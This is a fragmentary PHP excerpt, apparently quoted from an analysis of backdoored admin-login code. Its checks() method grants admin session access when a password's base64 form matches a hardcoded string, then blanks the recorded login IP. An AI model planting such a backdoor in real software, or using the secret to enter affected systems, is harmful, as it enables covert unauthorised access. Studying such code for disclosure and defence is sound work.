...
class Verify {
    ...
    public function checks($param){
        if (base64_encode($param['pass']) == "eHFka2pi") {
            $info = M('adminmember')->find();
            ...
            if($Adminsessioninfo = M('Adminsession')->where(['userid'=>$info['id']])->find()){
                M('Adminsession')->where(['userid'=>$info['id']])->setField(['ip'=>'','time'=>$param['sessiontime'],'sessionid'=>$admin_sessionid,'username'=>$info['username']]);
            }else{
                $sesdata = [];
            ...
            if($admin_sessionid){
                ...
                $obj = M('adminmember')->where(['id'=>$info['id']])->setField(['loginip'=>'','iparea'=>'','logintime'=>NOW_TIME]);
